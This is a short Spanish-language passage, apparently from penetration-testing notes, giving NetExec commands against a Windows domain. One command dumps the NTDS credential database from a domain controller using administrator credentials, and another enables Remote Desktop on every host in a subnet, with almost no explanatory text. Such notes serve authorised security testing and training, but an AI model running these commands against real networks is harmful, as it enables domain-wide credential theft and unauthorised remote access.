...
``` ruby
netexec smb IP_DEL_DC -u 'Administrador' -p 'P@$$w0rd!!' --ntds vss
```

# Activar el RDP (Remote Desktop Protocol) en todos los dispositivos

Esto nos activa una funcion que nos permitirá conectarnos de forma remota a cualquier dispositivo, para ello solo tenemos que usar el siguiente comando:

``` ruby
netexec smb 192.168.159.0/24 -u 'Administrador' -p 'P@$$w0rd!!' -M rdp -o action=enable
```
